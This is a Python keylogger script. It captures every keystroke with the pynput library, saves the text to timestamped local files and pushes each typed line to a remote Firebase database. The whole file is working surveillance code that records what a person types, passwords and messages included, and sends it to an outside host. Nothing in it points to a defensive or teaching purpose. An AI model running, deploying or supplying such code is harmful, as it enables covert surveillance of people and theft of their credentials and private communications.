import os
import time
from datetime import datetime
from pynput import keyboard
import firebase_admin
from firebase_admin import credentials, db



cred = credentials.Certificate("serviceAccountKey.json")  # 🔐 Add your key file securely
firebase_admin.initialize_app(cred, {
    'databaseURL': 'https://your-project-id.firebaseio.com/'  # 🔐 Replace with your actual Firebase URL
})

current_line = ""
last_folder_creation_time = time.time()
stop_listener = False

def create_folder_and_file():
    global last_folder_creation_time
    now = datetime.now()
    date_folder = now.strftime("%Y-%m-%d")
    time_folder = now.strftime("%H-%M")

    if not os.path.exists(date_folder):
        os.makedirs(date_folder)

    folder_path = os.path.join(date_folder, time_folder)
    if not os.path.exists(folder_path):
        os.makedirs(folder_path)

    last_folder_creation_time = time.time()
    return os.path.join(folder_path, "keystrokes.txt")

def write_to_file_and_firebase(key):
    global current_line
    try:
        key_str = str(key).replace("'", "")
        if key == keyboard.Key.space:
            current_line += " "
        elif key == keyboard.Key.enter:
            current_line += "\n"
            save_to_firebase(current_line)
            current_line = ""
        elif key == keyboard.Key.backspace:
            current_line += "[BACKSPACE]"
        elif key == keyboard.Key.tab:
            current_line += "[TAB]"
        elif hasattr(key, "char"):
            current_line += key.char
        else:
            current_line += f"[{key}]"

        # Save every 30 minutes
        if time.time() - last_folder_creation_time >= 1800:
            file_path = create_folder_and_file()
            with open(file_path, "a") as file:
                file.write(current_line)
            save_to_firebase(current_line)
            current_line = ""

    except Exception as e:
        print(f"Error: {e}")

def save_to_firebase(data):
    try:
        ref = db.reference('keystrokes')
        ref.push({
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'data': data
        })
    except Exception as e:
        print(f"Error saving to Firebase: {e}")

def on_press(key):
    global stop_listener
    if key == keyboard.Key.esc:
        stop_listener = True
        return False
    write_to_file_and_firebase(key)

print("Keylogger is running. Press ESC to stop.")
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

print("Keylogger has stopped.")
